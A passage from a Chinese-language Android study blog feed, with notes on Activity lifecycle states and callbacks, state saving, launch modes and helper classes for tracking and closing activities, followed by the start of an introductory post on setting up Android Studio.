id="活动状态"><a href="#活动状态" class="headerlink" title="活动状态"></a>活动状态</h3><p>每个活动在其生命周期中最多可能会有4中状态：</p><h4 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h4><p>当一个活动位于返回栈的栈顶时，这时活动就处于运动状态。</p><h4 id="暂停状态"><a href="#暂停状态" class="headerlink" title="暂停状态"></a>暂停状态</h4><p>当一个活动不再处于栈顶位置，但仍然可见时（比如弹出对话框时他的背景活动仍然是可见的，但它并不是处于栈顶位置），这时活动就进入了暂停状态。只有在内存极低的情况下，系统才会去考虑回收这种活动。</p><h4 id="停止状态"><a href="#停止状态" class="headerlink" title="停止状态"></a>停止状态</h4><p>当一个活动不再处于栈顶位置，并且完全不可见的时候，就进入了停止状态。系统仍然会为这种活动保存相应的状态和成员变量，但这并不是完全可靠的。当其他地方需要内存时，处于停止状态的活动会有可能被系统回收。</p><h4 id="销毁状态"><a href="#销毁状态" class="headerlink" title="销毁状态"></a>销毁状态</h4><p>当一个活动从返回栈中移除后就变成了销毁状态，系统会最倾向于回收处于这种状态的活动。</p><h3 id="活动的生存周期"><a href="#活动的生存周期" class="headerlink" title="活动的生存周期"></a>活动的生存周期</h3><p>Activity类中定义了7个回调方法，覆盖了生命活动周期的每一个环节：</p><ul><li>onCreate()这个方法会在活动第一次被创建的时候调用。在这个活动中应完成初始化操作，比如加载布局、绑定事件等。</li><li>onStart()这个方法在活动由不可见变为可见的时候调用。</li><li>onResume()这个方法在活动准备好和用户进行交互的时候调用，此时的活动一定位于返回栈的栈顶，并且处于运行状态。</li><li>onPause()这个方法在系统准备去启动或者恢复另一个活动的时候调用，我们通常会在这个方法中将一些消耗CPU资源释放掉，以及保存一些关键数据，但这个方法的执行速度一定要快，不然会影响到新的栈顶活动的使用。</li><li>onStop()这个方法在活动完全不可见的时候调用。它和onPause()区别在于如果启动的新活动是一个对话框式的活动，那么onPause()方法会得到执行，而onStop()方法并不会执行。</li><li>onDestory()这个方法在活动被销毁之前调用，之后活动的状态将变为销毁状态。</li><li>onRestart()这个方法在活动由停止状态变为运行状态之前调用，也就是活动被重新启动了。</li></ul><p>从而又可以将活动分为3中周期：</p><ul><li>完整生存期：活动在onCreate()和onDestory()之间所经历的就是完整生存期。一般会在onCreat()中完成各种初始化操作，而在onDestory()中完成释放内存操作。</li><li>可见生存期：活动在onStart()和onStop()之间所经历的就是可见生存期。在可见生存期内，活动对于用户总数可见的，即便有可能无法和用户进行交互。我们可以通过这两个方法，合理地管理那些对用户可见的资源。</li><li>前台生存期：活动在onResume()和onPause()之间所经历的就是前台生存期。在前台生存期内，活动总是处于运行状态，此时活动是可以喝用户进行交互的。</li></ul><h3 id="体验活动的生命周期"><a href="#体验活动的生命周期" class="headerlink" title="体验活动的生命周期"></a>体验活动的生命周期</h3><p>新建一个ActivityLifeCycleTest项目，并且运行Android Studio帮我们自动创建活动和布局，勾选Launcher Activity来讲创建的活动设置为主活动，活动名和布局名都使用默认值。</p><p>然后新建两个子活动——NormalActivity和DialogActivity，其布局名分别为normal_layout和dialog_layout。</p><p>修改normal_layout.xml为如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".NormalActivity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:text</span>=<span class="string">"This is a normal activity"</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改dialog_layout.xml文件为如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".DialogActivity"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:text</span>=<span class="string">"This is a dialog activity"</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改AndroidMainFest.xml的<code>&lt;activity&gt;</code>标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".DialogActivity"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:theme</span>=<span class="string">"@style/Theme.AppCompat.Dialog"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".NormalActivity"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这里@android:stylt/Theme.Dialog是用来指定为对话框式的主体。</p><p>接下来修改activity_main.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_normal_activity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start NormalActivity"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/start_dialog_activity"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Start DialogActivity"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，修改MainActivity代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MainACtivity"</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        </span><br><span class="line">        Button startNormalActivity = (Button) findViewById(R.id.start_normal_activity);</span><br><span class="line">        </span><br><span class="line">        Button startDialogActivity = (Button) findViewById(R.id.start_dialog_activity);</span><br><span class="line">        </span><br><span class="line">        startNormalActivity.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View V)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, NormalActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        startDialogActivity.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View V)</span></span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, DialogActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStart();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onStart"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onResume"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onPause"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStop();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onStop"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onDestroy"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onRestart();</span><br><span class="line">        Log.d(TAG, <span class="string">"I'm onRestart"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后，便可以体验一遍生命周期了。</p><h3 id="活动被回收后"><a href="#活动被回收后" class="headerlink" title="活动被回收后"></a>活动被回收后</h3><p>当A去启动B 后，A被回收了，而B按下back键返回A时，还是会正常显示A，但是这时并不会执行onRestrat()，而是执行onCreate()，因为活动A在这种情况下会被重新创建一次。</p><p>但是这种情况下A的临时数据和状态会丢失，Activity提供了onSaveInstanceState()回调方法，这个方法可以保证在活动被回收之前一定会被调用，因此我们可以通过这个方法来解决活动被回收时临时数据得不到保存的问题。</p><p>onSaveInstanceState()会携带一个Bundle类型的参数，Bundle提供了一系列的方法保存数据，比如可以用putString()方法保存字符串，putInt保存整型数据等。每个保存方法需要传入两个参数，分别是键和值。</p><p>在MainActivity中添加如下代码就可以将临时数据进行保存：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onSaveInstanceState</span><span class="params">(Bundle outState)</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onSaveInstanceState(outState);</span><br><span class="line">    String tempData = <span class="string">"Something you just typed"</span>;</span><br><span class="line">    outState.putString(<span class="string">"data_key"</span>, tempData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时，在onCreate中也有一个Bundle类型的参数，该参数在一般情况下为null，但如果在活动被系统回收之前有同过onSaveInstanceState()来保存数据的话，这个参数就会带有之前所保存的全部数据，我们只需要通过相应的取值方法将数据取出即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">    super.onCreate(savedInstanceState);</span><br><span class="line">    Log.d(TAG, &quot;onCreate&quot;);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">if(savedInstanceState !&#x3D; null)&#123;</span><br><span class="line">String tempData &#x3D; savedInstanceState.getString(&quot;data_key&quot;);</span><br><span class="line">Log.d(TAG, tempData);</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="活动的启动模式"><a href="#活动的启动模式" class="headerlink" title="活动的启动模式"></a>活动的启动模式</h2><p>启动模式一共有四种，分别是standard、singleTop、singleTask和singleInstance，可以在<code>&lt;activity&gt;</code>标签指定android:launchMode属性来选择启动模式。</p><h3 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h3><p>standard是活动默认的启动模式。在standard模式下，每当启动一个新的活动，它就会在返回栈中入栈，并处于栈顶位置。对于使用standard模式的活动，系统不会在乎这个活动是否已经在返回栈中存在，每次intent启动都会创建该活动的一个新实例。</p><h3 id="singleTop"><a href="#singleTop" class="headerlink" title="singleTop"></a>singleTop</h3><p>当活动启动模式指定为singleTop时，在启动活动时如果发现返回栈的栈顶已经是该活动，则认为可以直接使用它，不会再创建新的活动实例。</p><h3 id="singleTask"><a href="#singleTask" class="headerlink" title="singleTask"></a>singleTask</h3><p>当活动启动模式指定为singleTask时，每次启动该活动时系统首先会在返回栈中检查是否存在该活动的实例，如果发现已经存在则直接使用该实例，并把在这个活动之上的所有活动统统出栈；如果没有发现则会创建一个新的活动实例</p><h3 id="singleInstance"><a href="#singleInstance" class="headerlink" title="singleInstance"></a>singleInstance</h3><p>singleInstance模式的活动会启用一个新的返回栈来管理这个活动（其实如果singleTask模式指定了不同的taskAffinity，也会启动一个新的返回栈）。</p><p>在这种模式下，当允许活动被其他程序调用时，就会有一个单独的返回栈来管理这个活动，不管是哪个应用程序来访问这个活动，都共用同一个返回栈，从而实现共享活动实例。</p><p><img src="./day2/2.jpg" alt=""></p><h2 id="活动的最佳实践"><a href="#活动的最佳实践" class="headerlink" title="活动的最佳实践"></a>活动的最佳实践</h2><h3 id="知晓当前是在哪个活动"><a href="#知晓当前是在哪个活动" class="headerlink" title="知晓当前是在哪个活动"></a>知晓当前是在哪个活动</h3><p>这些选择在ActivityTest项目基础上修改。</p><p>首先新建一个BaseActivity类，继承androidx.appcompat.app.AppCompatActivity，然后重写onCreate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    Log.d(<span class="string">"BaseActivity"</span>, getClass().getSimpleName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后让所有的活动都继承BaseActivity而非AppCompatActivity。这样就可以Logcat中实时知晓当前界面对应哪一个活动了。</p><h3 id="随时随地退出程序"><a href="#随时随地退出程序" class="headerlink" title="随时随地退出程序"></a>随时随地退出程序</h3><p>新建一个ActivityCollector类作为活动管理器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivityCollector</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Activity&gt; activities = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.add(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeActivity</span><span class="params">(Activity activity)</span></span>&#123;</span><br><span class="line">        activities.remove(activity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">finishAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Activity activity : activities)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!activity.isFinishing())&#123;</span><br><span class="line">                activity.finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面修改BASEActivity中的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        Log.d(<span class="string">"BaseActivity"</span>, getClass().getSimpleName());</span><br><span class="line">        ActivityCollector.addActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        ActivityCollector.removeActivity(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从此，不管在什么地方想要退出程序，只需要调用ActivityCollector.FinishAll()就可以了。</p><p>另外，可以使用如下代码杀掉当前进程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.Process.killProcess(android.os.Process.myPid());</span><br></pre></td></tr></table></figure><h3 id="启动活动的最佳写法"><a href="#启动活动的最佳写法" class="headerlink" title="启动活动的最佳写法"></a>启动活动的最佳写法</h3><p>比如在SecondActivity中添加如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">actionStart</span><span class="params">(Context context, String data1, String data2)</span></span>&#123;</span><br><span class="line">    Intent intent=<span class="keyword">new</span> Intent(context, SecondActivity<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    intent.purExtra(<span class="string">"param1"</span>, data1);</span><br><span class="line">    intent.purExtra(<span class="string">"param1"</span>, data2);</span><br><span class="line">    context.startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样修改后，如果要在FirstActivity中启动SecondActivity，使用以下代码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecondActivity.actionStart(FirstActivity.<span class="keyword">this</span>, <span class="string">"data1"</span>, <span class="string">"data2"</span>);</span><br></pre></td></tr></table></figure><p>这样做的好处就是可以明确知道传递的参数。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;探究活动&quot;&gt;&lt;a href=&quot;#探究活动&quot; class=&quot;headerlink&quot; title=&quot;探究活动&quot;&gt;&lt;/a&gt;探究活动&lt;/h1&gt;&lt;h2 id=&quot;什么是活动&quot;&gt;&lt;a href=&quot;#什么是活动&quot; class=&quot;headerlink&quot; title=&quot;什么是活动&quot;&gt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day1</title>
    <link href="https://nuoye-blog.github.io/2020/05/25/Android/Android-day1/"/>
    <id>https://nuoye-blog.github.io/2020/05/25/Android/Android-day1/</id>
    <published>2020-05-25T06:30:00.000Z</published>
    <updated>2020-05-25T06:30:50.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因linux下的前景较窄，所以想了解下android下的一些内容，准备了好久，今天就正式吧。目前第一本书：《第一行代码:Android》。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Android系统架构"><a href="#Android系统架构" class="headerlink" title="Android系统架构"></a>Android系统架构</h2><p>Linux内核层</p><p>系统运行库层</p><p>应用框架层</p><p>应用层</p><h2 id="Android应用开发特色"><a href="#Android应用开发特色" class="headerlink" title="Android应用开发特色"></a>Android应用开发特色</h2><h5 id="四大组件"><a href="#四大组件" class="headerlink" title="四大组件"></a>四大组件</h5><p>活动（Activity）、服务（Service）、广播接收器（Broadcast Receiver）、内容提供器（Content Provider）</p><h5 id="丰富的系统控件"><a href="#丰富的系统控件" class="headerlink" title="丰富的系统控件"></a>丰富的系统控件</h5><h5 id="SQLite数据库"><a href="#SQLite数据库" class="headerlink" title="SQLite数据库"></a>SQLite数据库</h5><h5 id="强大的多媒体"><a href="#强大的多媒体" class="headerlink" title="强大的多媒体"></a>强大的多媒体</h5><h5 id="地理位置定位"><a href="#地理位置定位" class="headerlink" title="地理位置定位"></a>地理位置定位</h5><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先下载Android Studio：<a href="https://developer.android.google.cn/studio" target="_blank" rel="noopener">https://developer.android.google.cn/studio</a></p><p>安装的话直接跟着走就可以了，总的搭建过程还是比较简单的。</p><p>其中配置的时候会选择custom（自定义配置）还是standard（默认配置），看心情选吧。。</p><h2 id="第一个Android项目"><a href="#第一个Android项目" class="headerlink" title="第一个Android项目"></a>第一个Android项目</h2><h3 id="创建HelloWorld项目"><a href="#创建HelloWorld项目" class="headerlink" title="创建HelloWorld项目"></a>创建HelloWorld项目</h3><p>首先打开界面：</p><p><img src="./day1/1.jpg" alt=""></p><p>点击start a new Android Studio project，然后开始选择模板。</p><p><img src="./day1/2.jpg" alt=""></p><p>这里直接选择Empty Activity，并做如下配置：</p><p><img src="./day1/3.jpg" alt=""></p><p>点击Finish，等待一段时间后项目便创建成功了。</p><h3 id="启动模拟器"><a href="#启动模拟器" class="headerlink" title="启动模拟器"></a>启动模拟器</h3><p>点击右上角的图标：</p><p><img src="./day1/4.jpg" alt=""></p><p>默认已经有了Nexus 5X这台设备模拟器了，然后点击Actions栏最左边的三角形按钮即可启动（因为我是amd的cpu，安装不了hxam，armeabi-v7a的镜像也比较慢，所以用bluestacks来代替）。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>点击这个锤子</p><p><img src="./day1/5.png" alt=""></p><p>等待编译完成后，就可以在项目下的app\build\outputs\apk\debug中找到编译好的apk。</p><h3 id="安装运行"><a href="#安装运行" class="headerlink" 